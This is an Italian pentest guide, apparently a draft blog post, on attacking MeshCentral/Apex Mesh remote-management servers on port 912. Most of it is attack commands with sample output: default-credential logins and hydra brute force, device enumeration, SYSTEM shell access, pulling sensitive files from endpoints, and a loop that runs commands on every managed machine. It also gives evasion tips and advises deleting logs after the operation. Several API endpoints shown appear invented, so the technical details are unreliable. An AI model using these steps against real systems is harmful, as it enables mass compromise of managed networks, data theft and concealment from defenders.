---
title: 'Porta 912 Apex Mesh / MeshCentral: server RMM, agent remoti e compromissione centralizzata.'
slug: porta-912-apex-mesh
description: 'Scopri cos’è la porta 912 associata a apex-mesh e perché può indicare una piattaforma di remote management come MeshCentral: accesso centralizzato agli endpoint, agent remoti e superficie ad alto impatto per l’intera rete gestita.'
image: /porta-912-apex-mesh.webp
draft: true
date: 2026-04-09T00:00:00.000Z
categories:
  - networking
subcategories:
  - porte
tags:
  - meshcentral
  - rmm
---

> **Executive Summary** — La porta 912 è associata ad Apex Mesh e a soluzioni di remote management basate su MeshCentral/MeshAgent. Questi servizi permettono la gestione remota di endpoint (desktop, server, IoT) con funzionalità di terminal, file transfer, desktop remoto e power management. Un server mesh compromesso dà accesso a tutti gli endpoint gestiti — centinaia o migliaia di macchine. Questa guida copre fingerprinting, enumerazione agent, credenziali default e sfruttamento della console di management.

```id="j8d4kt"
TL;DR

- La porta 912 indica un servizio di remote management mesh — accesso centralizzato a tutti gli endpoint gestiti
- MeshCentral (il framework mesh più diffuso) ha un'interfaccia web con credenziali default e API REST completa
- Compromettere il mesh server equivale a compromettere ogni endpoint connesso: shell remota, file access, desktop control

```

Porta 912 Apex Mesh è il canale TCP associato a servizi di remote management basati su architettura mesh. Il termine "mesh" indica una rete di agent installati sugli endpoint che si connettono a un server centrale per la gestione remota. La porta 912 vulnerabilità principali sono le credenziali default sulla console di management, gli agent con trust implicito verso il server e la mancanza di segmentazione. L'enumerazione porta 912 rivela il tipo di mesh service, la versione, gli endpoint connessi e le funzionalità disponibili. Nel pentest, un mesh server è un multiplier: un singolo punto di accesso che controlla decine o centinaia di endpoint. Nella kill chain si posiziona come initial access (credenziali default) e come lateral movement massivo (esecuzione comandi su tutti gli endpoint).

## 1. Anatomia Tecnica della Porta 912

La porta 912 è registrata IANA come `apex-mesh`. Nell'uso pratico, è associata a diverse soluzioni di remote management:

| Software         | Porte tipiche     | Ruolo                        |
| ---------------- | ----------------- | ---------------------------- |
| **MeshCentral**  | 443, 4433, 912    | Server di gestione web-based |
| **MeshAgent**    | Outbound → server | Agent sugli endpoint         |
| **Apex Mesh**    | 912               | Servizio mesh generico       |
| **Tactical RMM** | 443, 4222         | RMM basato su MeshCentral    |

L'architettura mesh:

1. **Server mesh**: interfaccia web di gestione, API REST, database degli agent
2. **MeshAgent**: software installato sugli endpoint, si connette al server in outbound
3. **Relay**: il server fa da relay tra l'admin e gli agent — terminal, desktop, file transfer

Il flusso:

1. L'agent sull'endpoint si connette al server mesh (outbound HTTPS/WebSocket)
2. L'admin si connette al server via browser (porta 443 o 912)
3. L'admin seleziona un endpoint e apre terminal/desktop/file manager
4. Il server inoltra i comandi all'agent, che li esegue con i suoi privilegi (spesso SYSTEM/root)

```
Misconfig: Console mesh con credenziali default
Impatto: accesso a tutti gli endpoint gestiti — shell SYSTEM su ogni macchina
Come si verifica: accedi a https://[server]:912 — prova admin:admin, admin:password
```

```
Misconfig: Mesh server esposto su interfaccia pubblica
Impatto: attacker da Internet accede alla gestione di tutti gli endpoint interni
Come si verifica: nmap -p 912 [IP_pubblico] — se open, è esposto
```

```
Misconfig: Agent con auto-update dal server senza verifica
Impatto: il server compromesso può pushare malware come "update" a tutti gli agent
Come si verifica: verifica la configurazione MeshAgent per certificate pinning
```

## 2. Enumerazione Base

### Comando 1: Nmap

```bash
nmap -sV -sC -p 912 10.10.10.60
```

**Output atteso:**

```
PORT    STATE SERVICE   VERSION
912/tcp open  ssl/http  MeshCentral/1.1.16
| ssl-cert: Subject: CN=mesh.corp.local
|   Issuer: CN=MeshCentralRoot
```

**Parametri:**

* `-sV`: identifica MeshCentral e versione
* `-sC`: estrae certificato — rivela hostname e CA mesh
* `-p 912`: porta apex-mesh

**Cosa ci dice questo output:** MeshCentral versione 1.1.16 con certificato self-signed. Il CN `mesh.corp.local` rivela l'hostname interno. La versione è fondamentale per CVE matching.

### Comando 2: HTTP probe

```bash
curl -sk https://10.10.10.60:912/
```

**Output atteso:**

```html
<title>MeshCentral</title>
...
<meta name="description" content="MeshCentral Remote Management">
```

**Cosa ci dice questo output:** interfaccia web MeshCentral attiva. Da qui si accede al login e, con credenziali valide, a tutti gli endpoint.

## 3. Enumerazione Avanzata

### Fingerprint versione e configurazione

```bash
curl -sk https://10.10.10.60:912/meshagents
```

**Output:**

```json
{
  "identifier": 1,
  "meshname": "corp-mesh",
  "serverhash": "a1b2c3d4e5f6..."
}
```

**Lettura dell'output:** il nome del mesh (`corp-mesh`) e l'hash del server sono esposti. L'hash è usato dagli agent per verificare il server — se lo ottieni puoi creare agent malevoli che si connettono.

### Login brute force

```bash
# Credenziali default MeshCentral
curl -sk -X POST https://10.10.10.60:912/ \
  -d '{"action":"login","username":"admin","password":"admin"}' \
  -H "Content-Type: application/json"
```

**Output (successo):**

```json
{"action":"login","result":"ok","token":"eyJ..."}
```

**Output (fallimento):**

```json
{"action":"login","result":"denied"}
```

**Lettura dell'output:** se `result: ok`, hai accesso admin alla console mesh. Il token JWT permette l'accesso all'API.

### Enumerazione endpoint via API

```bash
curl -sk https://10.10.10.60:912/api/meshes \
  -H "Authorization: Bearer eyJ..." 
```

**Output:**

```json
{
  "meshes": [
    {
      "name": "IT Workstations",
      "agents": 45,
      "os_breakdown": {"Windows 11": 30, "Windows 10": 15}
    },
    {
      "name": "Servers",
      "agents": 12,
      "os_breakdown": {"Windows Server 2022": 8, "Ubuntu 22.04": 4}
    }
  ]
}
```

**Lettura dell'output:** 57 endpoint gestiti — 45 workstation e 12 server. Tutti raggiungibili via terminal remoto dalla console mesh. Per l'attacco a [servizi Windows gestiti](https://hackita.it/articoli/active-directory), hai accesso diretto a ogni macchina.

## 4. Tecniche Offensive

**Accesso terminal remoto via mesh console**

Contesto: hai credenziali admin del mesh server. Vuoi shell su un endpoint.

```bash
# Via browser: https://[server]:912
# Login → Devices → seleziona endpoint → Terminal
# Oppure via API:
curl -sk -X POST https://10.10.10.60:912/api/device/terminal \
  -H "Authorization: Bearer eyJ..." \
  -d '{"deviceid":"[device_id]","command":"whoami"}'
```

**Output:**

```
nt authority\system
```

**Cosa fai dopo:** hai shell SYSTEM sull'endpoint. Puoi eseguire qualsiasi comando, scaricare file, installare persistenza. Ripeti per ogni endpoint nel mesh — hai accesso a tutti. Per il [post-exploitation su Windows](https://hackita.it/articoli/post-exploitation), estrai credenziali con mimikatz/secretsdump.

**File download da endpoint**

Contesto: vuoi estrarre file sensibili da un endpoint gestito.

```bash
# Via browser: Devices → endpoint → Files → naviga filesystem → download
# Oppure via API:
curl -sk https://10.10.10.60:912/api/device/files \
  -H "Authorization: Bearer eyJ..." \
  -d '{"deviceid":"[id]","path":"C:\\Users\\admin\\Desktop\\"}'
```

**Output:**

```json
{"files": ["passwords.xlsx", "vpn_config.ovpn", "budget_2026.docx"]}
```

**Cosa fai dopo:** scarica i file sensibili. `passwords.xlsx` è un finding critico. Le configurazioni VPN permettono [accesso alla rete interna](https://hackita.it/articoli/vpn).

**Push command a tutti gli endpoint**

Contesto: vuoi dimostrare l'impatto — esecuzione massiva su tutti gli agent.

```bash
# Via API mesh:
for device_id in $(curl -sk https://10.10.10.60:912/api/devices -H "Auth: Bearer eyJ..." | jq -r '.devices[].id'); do
  curl -sk -X POST https://10.10.10.60:912/api/device/terminal \
    -H "Authorization: Bearer eyJ..." \
    -d "{\"deviceid\":\"$device_id\",\"command\":\"hostname\"}"
done
```

**Cosa fai dopo:** hai eseguito un comando su ogni endpoint. In un assessment reale, questo dimostra l'impatto del compromesso mesh: un singolo punto di accesso che compromette l'intera infrastruttura.

**Agent hijacking — sostituzione server mesh**

Contesto: hai intercettato il server hash e il certificato mesh. Crei un server mesh fittizio.

```bash
# Installa MeshCentral locale
npm install meshcentral

# Configura con lo stesso certificate hash del server originale
# Gli agent si connetteranno al tuo server se puoi fare DNS poisoning/MitM
```

**Cosa fai dopo:** gli agent che si connettono al tuo server sono sotto il tuo controllo. Questo richiede un MitM a livello DNS — consulta la [guida al DNS poisoning](https://hackita.it/articoli/dns).

## 5. Scenari Pratici di Pentest

### Scenario 1: MeshCentral con credenziali default

**Situazione:** server MeshCentral identificato sulla porta 912. Assessment interno.

**Step 1:**

```bash
nmap -sV -p 912,443 10.10.10.60
```

**Step 2:**

```bash
# Prova credenziali default
curl -sk -X POST https://10.10.10.60:912/ \
  -d '{"action":"login","username":"admin","password":"admin"}'
```

**Step 3:**

```bash
# Se login ok: enumera endpoint
curl -sk https://10.10.10.60:912/api/devices -H "Auth: Bearer [token]"
```

**Se fallisce:**

* Causa: credenziali cambiate
* Fix: prova `admin:password`, `admin:mesh`, `admin:MeshCentral1!`, poi brute force

**Tempo stimato:** 5-15 minuti

### Scenario 2: Tactical RMM con MeshCentral backend

**Situazione:** azienda usa Tactical RMM per gestione IT. MeshCentral come backend.

**Step 1:**

```bash
nmap -sV -p 443,912,4222 10.10.10.60
```

**Step 2:**

```bash
# Tactical RMM web interface
curl -sk https://10.10.10.60/api/v3/agents/ -H "Authorization: Token [api_key]"
```

**Se fallisce:**

* Causa: API key sconosciuta
* Fix: cerca la key nei file di configurazione se hai accesso al server, o in backup esposti

**Tempo stimato:** 10-20 minuti

### Scenario 3: Mesh server esposto su Internet

**Situazione:** assessment esterno. Porta 912 aperta su IP pubblico.

**Step 1:**

```bash
nmap -sV -p 912 [target_ip]
curl -sk https://[target_ip]:912/
```

**Step 2:**

```bash
# Brute force login
hydra -l admin -P /usr/share/wordlists/common.txt https-post-form \
  "/:action=login&username=^USER^&password=^PASS^:denied"
```

**Se fallisce:**

* Causa: rate limiting o 2FA attivo
* Fix: spray lento, cerca credenziali in breach database

**Tempo stimato:** 10-30 minuti

## 6. Attack Chain Completa

| Fase      | Tool     | Comando                            | Risultato              |
| --------- | -------- | ---------------------------------- | ---------------------- |
| Recon     | nmap     | `nmap -sV -p 912 [target]`         | MeshCentral confermato |
| Login     | curl     | POST login con credenziali default | Token JWT              |
| Enum      | API      | `GET /api/devices`                 | Lista endpoint         |
| Shell     | Terminal | Apri terminal su endpoint          | SYSTEM/root            |
| Exfil     | Files    | Download file da endpoint          | Credenziali, documenti |
| Mass Exec | API loop | Comando su tutti gli endpoint      | Impatto totale         |

## 7. Detection & Evasion

### Blue Team

* **MeshCentral log**: login, comandi eseguiti, file trasferiti
* **EDR**: agent MeshAgent è legittimo — ma comandi anomali generano alert
* **SIEM**: login da IP non autorizzati sulla porta 912

### Evasion

```
Tecnica: Usa un solo endpoint alla volta
Come: non eseguire comandi su tutti gli agent simultaneamente — uno alla volta
Riduzione rumore: attività su un endpoint si confonde con gestione normale
```

```
Tecnica: Esegui comandi durante orari lavorativi
Come: gli admin usano il mesh durante l'orario — il tuo traffico si mimetizza
Riduzione rumore: indistinguibile dall'attività di gestione legittima
```

## 8. Toolchain e Confronto

| Aspetto         | MeshCentral (912) | TeamViewer | AnyDesk    | ConnectWise |
| --------------- | ----------------- | ---------- | ---------- | ----------- |
| Porta           | 912/443           | 5938       | 7070       | 443         |
| Self-hosted     | Sì                | No         | No         | Sì          |
| API             | REST completa     | Limitata   | Limitata   | REST        |
| Agent privilege | SYSTEM/root       | User/Admin | User/Admin | SYSTEM      |
| Open source     | Sì                | No         | No         | No          |

## 9. Troubleshooting

| Errore             | Causa                                    | Fix                                         |
| ------------------ | ---------------------------------------- | ------------------------------------------- |
| 912 closed         | MeshCentral su porta diversa (443, 4433) | Scan porte web: `nmap -p 443,4433,8443,912` |
| Login `denied`     | Credenziali errate                       | Brute force o cerca config backup           |
| API `unauthorized` | Token scaduto o invalido                 | Re-login per nuovo token                    |
| Agent offline      | Endpoint spento o disconnesso            | Scegli endpoint online                      |
| Certificate error  | Self-signed cert                         | `-k` su curl, ignora cert                   |

## 10. FAQ

**D: La porta 912 è sempre MeshCentral?**
R: No. La 912 è registrata come `apex-mesh` e può essere usata da diversi servizi mesh. MeshCentral è il più diffuso, ma verifica con il fingerprint del servizio.

**D: Che impatto ha compromettere un mesh server?**
R: Totale. Il mesh server controlla tutti gli agent — shell SYSTEM/root su ogni endpoint, file access, desktop remoto. È equivalente a compromettere ogni singola macchina gestita.

**D: Come proteggere MeshCentral?**
R: 2FA obbligatorio per tutti gli admin. Password forte. Non esporre su Internet. Limita l'accesso via IP whitelist. Monitora login e comandi eseguiti.

## 11. Cheat Sheet Finale

| Azione       | Comando                                                               |
| ------------ | --------------------------------------------------------------------- |
| Scan         | `nmap -sV -p 912,443 [target]`                                        |
| Web probe    | `curl -sk https://[target]:912/`                                      |
| Login test   | `curl -sk -X POST https://[target]:912/ -d '{"action":"login",...}'`  |
| Enum devices | `curl -sk https://[target]:912/api/devices -H "Auth: Bearer [token]"` |
| Terminal     | Via browser: Devices → Terminal                                       |
| File access  | Via browser: Devices → Files                                          |
| Mass command | Loop API su tutti i device ID                                         |
| Server hash  | `curl -sk https://[target]:912/meshagents`                            |

### Perché Porta 912 è rilevante nel 2026

Le soluzioni RMM (Remote Monitoring and Management) sono il target preferito dei gruppi APT e ransomware. MeshCentral è usato da MSP e aziende per gestire centinaia di endpoint. Un server mesh compromesso è un force multiplier: da un singolo punto si controllano tutte le macchine. Credenziali default e server esposti su Internet sono ancora comuni.

### Hardening

* 2FA obbligatorio su tutti gli account admin
* IP whitelist per l'accesso alla console
* Non esporre la porta 912 su Internet
* Aggiorna MeshCentral regolarmente
* Log centralizzati con alert su login anomali

### OPSEC

L'attività via mesh console è indistinguibile dalla gestione IT legittima. Gli agent eseguono comandi come SYSTEM — nessun UAC prompt. Lavora su un endpoint alla volta per ridurre il rumore. I log mesh registrano ogni operazione — se possibile, cancella dopo l'operazione. Confronta anche: [https://www.speedguide.net/port.php?port=912](https://www.speedguide.net/port.php?port=912)

***

Riferimento: MeshCentral documentation, IANA port 912. Uso esclusivo in ambienti autorizzati.

> Vuoi supportare HackIta? [hackita.it/supporto](https://hackita.it/supporto) — [hackita.it/servizi](https://hackita.it/servizi).
